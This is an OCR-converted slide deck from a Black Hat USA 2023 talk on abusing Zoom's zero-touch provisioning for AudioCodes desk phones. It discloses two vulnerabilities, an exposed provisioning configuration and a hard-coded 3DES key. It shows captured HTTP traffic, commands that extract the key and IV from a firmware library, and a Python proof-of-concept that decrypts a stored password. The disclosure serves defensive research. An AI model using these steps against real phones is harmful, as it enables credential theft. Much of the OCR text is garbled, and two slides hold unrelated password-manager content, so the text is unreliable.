---
title: "Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones"
speakers: ["Moritz Abrell"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf"
pages: 148
sha256: "2bf1ee277468c9d8b6a8de131e46b4645454abcc2cd9e07893ada9359d83acb3"
text_chars: 41706
ocr_pages: 98
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.6
ocr_unreliable_blocks: 0
vision_verified_blocks: 3
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:16:58Z"
---
# Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones

**Speakers:** Moritz Abrell  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf` (148 pages)


## Slide 1

Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones

Speaker:

Moritz Abrell, SySS GmbH

#BHUSA @BlackHatEvents

## Slide 2

## About this Talk

#BHUSA @BlackHatEvents

## Slide 3

## Who am I?

#### Moritz Abrell

@moritz_abrell

#### Senior IT Security Consultant

SySS GmbH

Hacking Hard- and Software

Various national and international Hacking and InfoSec Conferences

#BHUSA @BlackHatEvents

## Slide 4

## Motivation

#BHUSA @BlackHatEvents

## Slide 5

## On-Premise (traditional)

malicious  sensitive
configuration data…

Configuration Server

Phone

#BHUSA @BlackHatEvents

## Slide 6

## Motivation

- Traditional endpoint provisioning is not secure e.g.:

   - Accessible sensitive Information

   - Insufficient or missing authentication

   - Missing transport encryption

   - Missing server/client verification

- Combining traditional devices with cloud communication services?

#BHUSA @BlackHatEvents

## Slide 7

## Motivation

- Traditional endpoint provisioning is not secure e.g.:

   - Accessible sensitive Information

   - Insufficient or missing authentication

   - Missing transport encryption

   - Missing server/client verification

- Combining traditional devices with cloud communication services?

- Huge potential impact

#BHUSA @BlackHatEvents

## Slide 8

## Why Zoom?

#BHUSA @BlackHatEvents

## Slide 9

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 10

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 11

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 12

Source: https://support.zoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Supported-Devices #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Zoom Phone Certified Hardware
Last Updated: June 15, 2023
The table below provides the list of supported phone devices for Zoom Phone. You can also see a list of supported features.
Before you add devices to Zoom Phone, see an overview of the provisioning process.
For Zoom Phone Appliances, see our list of certified devices.
For Zoom Certified Devices, see the list of Zoom Certified Devices.
This article covers:
e Encryption
e Desk phones
e AudioCodes
« Cisco
e Grandstream
e Check the hardware version number of your Grandstream desk phone
« Poly
e Yealink
e Analog gateways
e AudioCodes
e Cisco
e Grandstream
e Upgrade an ATA Grandstream firmware
e Verify an ATA Grandstream unit has the updated Gen 2 device factory certificate installed
e Find an ATA Grandstream LAN MAC address value
e Poly
e Desk phone accessories
e Cisco
e Poly
e Yealink
e Session Border Controllers
e AudioCodes
Source: https://supportzoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Supported-Devices
#BHUSA @BlackHatEvents
```

## Slide 13

#BHUSA @BlackHatEvents

Source: https://blog.zoom.us/millions-of-reasons-to-celebrate-zoom-phone/


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat
USA 2023
5 Reasons Zoom Phone Has Sold 4
Million Seats So Quickly
September 9, 2022 - 8 min read
Source: https://blog.zoom.us/millions-of-reasons-to-celebrate-zoom-phone/
```

## Slide 14

## Hardware

- AudioCodes C450HD IP-Phone

- Publicly downloadable firmware

- Support for ZTP

- Multiple use cases

#BHUSA @BlackHatEvents

## Slide 15

Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Desk-Phones-and-Devices

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ Provisioning DeskPhone: x | + v -
Zoom Support Products — Solutions Resources Plans & Pricing Joiny Hosty Signin
Product Support» Supportby Topic~ MoreSupport~ Contact Support Q Search
Zoom Support > em Support > Settings and Configuration for Zoom Phone > Provisioning Desk Phones and Devices
Provisioning Desk Phones and Devices
Provision phones and hardware to use them with Zoom Phone. Use desk phone provision templates and other provisioning guides to perform
advanced provisioning configurations.
AudioCodes MP504/508 (formally MS5OOLi) ATA device Configuring desk phone provision templates
provisioning Assisted provisioning URLs
Cisco assisted provisioning guide Poly assisted provisioning guide
Zoom Phone firmware resync and Auto Pulling Yealink assisted provisioning guide
Resetting to factory default (Poly) Re-syncing a desk phone or common area phone with the zero
Resetting to factory default (Yealink) touch provisioning (ZTP) server
Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Desk-Phones-and-Devices
```

## Slide 16

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 17

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 18

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
desk phone the provisioning and configuration
server for the added device
Q,
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 19

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
Q,
IT administrator
ZOOM ne and assigns
a configuration template
desk phone
```

## Slide 20

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 21

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 22

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 23

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Request
Raw Hex
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
Conmection: close
LA
```

## Slide 24

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Request
Raw
Hex
1 GET |/@@988F9D8992
2 Host:
LA
close
HTTP/1.1
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
```

## Slide 25

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Request
Raw Hex
1 GET |/@@9R8F9D8992 |HTTP/1.1
2 Host: |redirect.audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.6@4/1
Conmection: close
LA
```

## Slide 26

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Response
Raw Hex Render
HTTP/1.1 302 Found
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
```

## Slide 27

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Response
Raw Hex Render
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
```

## Slide 28

## Vendor Redirect Service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Redirect Service
Response
Raw Hex Render
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
```

## Slide 29

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET /@@9@8F9D8993 HITP/1.1
Host: redirect.audiocodes.com
Accept: */*
5 Connection: close
Lil Pa
Response
Raw Hex Render
HTTP/1.1 382 Found
Content-Length: 6
Connection: close
Content-Type: text/plain; charset=utf-8
5 Date: Thu, 29 Jun 2823 @8:31:18 GMT
6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
```

## Slide 30

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
1 GET) /@@988F9D8993 HTTP/1.1
2 Host: redirect.audiocodes.com
Accept: */*
Connection: close
Response
Raw Hex Render
HTTP/1.1 382 Found
Content-Length: 6
Connection: close
Content-Type: text/plain; charset=utf-8
Date: Thu, 29 Jun 2823 08:31:18 GMT
6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
LA
```

## Slide 31

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Raw Hex Render
1 HTTP/1.1 302 Found
2 Content-Length: @
3 Connection: close
4 Content-Type: text/plain; charset=utTf-&
> Date: Tue, 68 Nov 2022 18:20:39 GMT
6 Location: https://SecureProvService.
7 Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44eaT5c51b
```

## Slide 32

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Date:
6 Locati
Raw
Tue,
Hex Render
HTTP/1.1 3@2 Found
Content-Length: @
Connection: close
Content-Type: text/plain: charset=utTf-&
@8 Nov 2022 16:28:39 GMT
7 Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44eaT5c51b
```

## Slide 33

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Raw Hex Render
HTTP/1.1 302 Found
Content-Length: 6
Connection: close
Content-Type: text/plain: charset=utf-&
5 Date: Fri, 13 Jan 2023 @7:58:082 GMT
6 Location: https:/ 2] firmware.
fos
```

## Slide 34

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Raw Hex Render
HTTP/1.1 288 OK
Date: Tue, 68 Nov 2822 11:19:57 GMT
Server: Apache
Strict-Transport-Security: max-age=63872808; includeSubdomains; preload
Upgrade: h2
6 Connection: Upgrade, close
7 X-XSS-Protection: 1: mode=block
8 X-Content-Type-Options: nosniff
9 Content-Type: text/plain; charset=UTF-8
1@ Set-Cookie: BIGipServerPORTAL_8@=1010
Content-Length: 3352
fs
;Special interop - Genband
Voip/services/application_server_type=GENBAND
;Private Line settings
& voip/line/@/enabled=1
19 voip/line/@/auth_name=
21 voip/line/@/description=
22 voip/line/@/id=
23 voip/line/@/line_mode=PRIVATE
24 voip/line/@/account_type=SIP
```

## Slide 35

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET /pub/MP202-DMS-Flash-USA.CONF HTTP/1.1
Host: redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
> Connection: close
Response
Raw Hex
HTTP/1.1 288 OK
Content-Length: 528
Connection: close
Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
```

## Slide 36

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
Host: redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
> Connection: close
Response
Raw Hex
HTTP/1.1 288 OK
Content-Length: 528
Connection: close
Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
```

## Slide 37

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
Connection: close
LA
Response
Raw Hex
1 HTTP/1.1 208 OK
2 Content-Length: 528
3 Connection: close
Content-Type: application/octet-stream
Date: Wed, 26 Oct 2022 18:59:21 GMT
LA
```

## Slide 38

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
Connection: close
LA
Response
Raw Hex
2) Content-Length: 528
3 Connection: close
4 Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
```

## Slide 39

## SYSS-2022-053

- SYSS-2022-053

- Exposure of sensitive Information to an unauthorized Actor (CWE-200)

#BHUSA @BlackHatEvents

## Slide 40

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Pretty Raw Hex
13 X-Content-Type-Options: nosnift
14 Connection: close
16 ems_server/provisioning/url=https: //1ppdm. audiocodes.com/
1? provisioning/method=STATIC
19 provisioning/firmware/url=https: //1ppdm. audiocodes.com/firmwaretiles/
21 ems_server/user_password={
i
```

## Slide 41

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ echo "Vv1Z0p5/5pM=" | base64 -d | xxd
```

## Slide 42

#BHUSA @BlackHatEvents

Source: https://www.audiocodes.com/library/firmware


> Recovered by OCR — confidence 93/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IP Phone Software Image Files
Click here to download the latest software image files of the AudioCodes IP Phones
Source: https://www.audiocodes.com/library/firmware
```

## Slide 43

## Password Encryption

- Imports of **_AC_Decrypt_Param_** and **_decrypt_string_** from **_/lib/libac_des3.so_**

   - _/lib/libcgi.so_

   - _/lib/libdevice_management.so_

   - _/lib/libaq201.so_

   - _/home/ipphone/bin/voip_task_SFB_

   - _/home/ipphone/bin/nxphone_

   - _/home/ipphone/bin/emsc_

   - _/home/ipphone/bin/http_services_

#BHUSA @BlackHatEvents

## Slide 44

#BHUSA @BlackHatEvents

## Slide 45

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
undefined
2d
ae
ae
ae
ff
eg
e]
el
el
eb
undefined AC_Decrypt_Param{ }
cpy r4,rl
bl decrypt_string
```

## Slide 46

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
18
11
12
13
14
15
16
18
19
28
21
22
23
a4
26
28
31
32
33
35
37
38
39
a1
42
43
45
undefined4 decrypt_string(char *param_1,undefined4 param_2)
size_t sVarl;
int iVar2;
undefined4 uVar3:
undefined4 *puVars;
undefined4 *puVar6;
undefined auStack_182@ [2044]:
char acStack_1024 [4]:
char acStack_102@ [2048];
undefined4 local_82@ [2]:
undefined local_818 [17]:
undefined auStack_8@7 [2027]:
do {
puVar6 = puVar5 + 2;
uVar3 = puVar5[1i];
*ouVard = *puVars;
puVar4[1] = uVar3;
puVar4 = puVard + 2:
} while (puVar6 != &UNK_00010Td®);
memset (auStack_807,0,@x7e7):
sVarl = strlen(param_1);
if (((sVarl < 5) || (iVar2 = strncmp(param_1,"{\"",2), iVar2 != @)) ||
(iVar2 = strncmp(param_1 + (sVari - 2),"\"}",2), iVar2 != 8)) {
uVar3 = OxffffffftT:
}
else {
strncpy(acStack_102@,param_1 + 2,sVarl - 4);
acStack_102@[sVari - 4] = '\O';
sVarl = strlen(acStack_1028):
uVar3 = base64_decode(acStack_1020, sVari, auStack_1820):
uVar3 = @:
}
return uVar3;
#BHUSA @BlackHatEvents
```

## Slide 47

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
37
38
39
41
42
43
else {
strncpy(acStack_1020,param_1 + 2,sVarl - 4);
acStack_ 1@2@[sVarl - 4] = '\@':
sVarl = strlen(acStack_1020):
des3_crypt(auStack_1820, param_2,uVar3, local_820,6);
uVars = @:
r
#BHUSA @BlackHatEvents
```

## Slide 48

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
48 DES_set_key_unchecked(param_4,&D5tack
51 DES_ede3_cbc_encrypt(input,param_2,
_1a8);
49 DES_set_key_unchecked(param_4[1] ,&2DStack_128);
58 DES_set_key_unchecked(param_4[2] ,&DSta
```

## Slide 49

Source: https://www.openssl.org/docs/man3.0/man3/DES_ede3_cbc_encrypt.html

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
os /docs/man3.0/man3/DE
€ C @ openssl.org/docs/n
1an3.0/man3/DES
void DES _ede3_cbc_encrypt(const unsigned ‘input, unsigned
long length, DE
DES key schedule 5
*ivec, 1 enc
```

## Slide 50

#BHUSA @BlackHatEvents

## Slide 51

### **IV**

### **KEY**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IV
KEY
o0010fb4 [4] 35h, CBh,
GOO1ETbS [6] 60h, 40h, 75h, FBh,
```

## Slide 52

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
# Extraction of the Key:
$ offset=$(python3 -c 'print(int("@@000fb8", base=16))')
$ dd skip=$offset count=24 if=libac_des3.so of=key.bin bs=1
# Extraction of the IV:
$ offset=$(python3 -c 'print(int("@0@00fTb@", base=16))')
$ dd skip=$offset count=8 if=libac_des3.so of=iv.bin bs=1
```

## Slide 53

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
#!/usr/bin/env python3
# -*- coding: utf-& -*-
import sys
import base64
from Crypto.Cipher import DES3
from binascii import unhexlify
def decrypt(ciphertext):
ciphertext_decoded base64 .b64decode (ciphertext)
cipher = DES3.new(KEY, DES3.MODE_CBC, iv-IV)
plaintext cipher.decrypt(ciphertext_decoded)
print("plain text password: {}".format(plaintext.decode('utf-8')))
def main():
decrypt(sys.argv[1])
```

## Slide 54

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ python3 poc.py Vv1Z0p5/5pM=
plain text password: system
```

## Slide 55

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ python3 poc.py Vv1Z0p5/5pM=
plain text password: |system
```

## Slide 56

# **…**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
fs
LA
Raw Hex Render
HTTP/1.1 20@ OK
Server: Apache
X-Frame-Options: SAMEORIGIN
Referrer-Policy: no-referrer
6 Cache-Control: no-cache, no-store, max-age=@®, must-revalidate
Strict-Transport-Security: max-age=31536000; includeSubDomains
ems_server/provisioning/url=https: //ippdm. audiocodes.com:443/
ems_server/user_name= @audiocodes.com
ems_server/user_password={"nQb iw==" }
5|personal_settings/ language=English
```

## Slide 57

## SYSS-2022-052

- SYSS-2022-052

- CVE-2023-22957

- Use of hard-coded Cryptographic Key (CWE-321)

#BHUSA @BlackHatEvents

## Slide 58

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
28.1
Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» To encrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f <filename>.cfg
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 59

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» Toencrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f ———
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 60

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» Toencrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f ———
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 61

## /lib/libcgi.so

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
sVar2 = strlen(acStack_1e8}:
iVarl = strcmp(acStack_1leé
if (iVarl == @) {
__ format = |/home/ipphone/bin/decryption_tool
(sVar2 - 4),".cfx");
-f /tmp/back_file.cfx -o %s >
```

## Slide 62

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ strings -n 32 decryption_tool
openssl_crypt EVP_BytesToKey ERROR cipher[%d], strlen((char*)pw) [%d]
openssl_crypt EVP_CipherInit ERROR
openssl_crypt EVP_CipherUpdate ERROR
openssl_crypt EVP_CipherFinal ERROR
des3_crypt: Cipher context can't be NULL!
des3_crypt: Input buffer can't be NULL!
des3_crypt: Output buffer can't be NULL!
init_cipher: RAND_pseudo_bytes ERROR. Can't generate random salt!
init_cipher: EVP_BytesToKey |ERROR. Can't generate key and IV!
init_cipher: EVP_CipherInit ERROR. Can't initialize cipher
Tinal_cipher: Cipher context can't be NULL!
Tinal_cipher: Output buffer can't be NULL!
Tinal_cipher EVP_CipherFinal ERROR
h4dA
Use: %s -f <input Tile name> -o <output Tile name>
Invalid command line parameters.
```

## Slide 63

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ strings -n 32 decryption_tool
openssl_crypt EVP_CipherInit ERROR
openssl_crypt EVP_CipherUpdate ERROR
openssl_crypt EVP_CipherFinal ERROR
des3_crypt: Cipher context can't be NULL!
des3_crypt: Input buffer can't be NULL!
des3_crypt: Output buffer can't be NULL!
init_cipher: RAND_pseudo_bytes ERROR. Can't generate random salt!
init_cipher: EVP_BytesToKey ERROR. Can't generate key and IV!
init_cipher: EVP_CipherInit ERROR. Can't initialize cipher
Tinal_cipher: Cipher context can't be NULL!
Tinal_cipher: Output buffer can't be NULL!
Tinal_cipher EVP_CipherFinal ERROR
h4dA
Use: %s -f <input Tile name> -o <output Tile name>
Invalid command line parameters.
```

## Slide 64

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Countermeasures

PASSWORD MANAGERS

1.1 NativeView
ChildrenCount: 2
AutoFillId: 1073741829
WebDomain: null

1.2 WebView
ChildrenCount: 2
AutoFillId: 1073741826
WebDomain: m.facebook.com

1.1.1 Username
AutoFillId: 1073741824
Dimension: 300x100

1.1.2 Password
AutoFillId: 1073741825
Dimension: 300x100

1.2.1 Username
AutoFillId: 1073741826:196608
Dimension: 300x100

1.2.2 Password
AutoFillId: 1073741826:196609
Dimension: 300x100
```

## Slide 65

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 68/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Countermeasures

AssistStructure data for request-triggering view only

No excess information!

PASSWORD MANAGERS

1.1 NativeView
ChildrenCount: 2
AutoFillId: 1073741829
WebDomain: null

1.2 WebView
ChildrenCount: 2
AutoFillId: 1073741826
WebDomain: m.facebook.com

1.1.1 Username
AutoFillId: 1073741824
Dimension: 300x100

1.1.2 Password
AutoFillId: 1073741825
Dimension: 300x100

1.2.1 Username
AutoFillId: 1073741826:196608
Dimension: 300x100

1.2.2 Password
AutoFillId: 1073741826:196609
Dimension: 300x100
```

## Slide 66

#BHUSA @BlackHatEvents

## Slide 67

#BHUSA @BlackHatEvents

## Slide 68

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Af
68
ae
be
2d
Ad
ae
ag stmdb sp!,{r4,r5,16,1
el cpy T6,param_2
e2 sub sp, sp, #Oxtc
el cpy ril,param_3
XREF [1]:
```

## Slide 69

#BHUSA @BlackHatEvents

## Slide 70

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
80011228 43 Te
TT
el
e5
el
eb
cpy param_4,1r/
str ro, [sp,#local_118]
cpy param_1,r4
ldr param_?,[sp,#local_1@c]
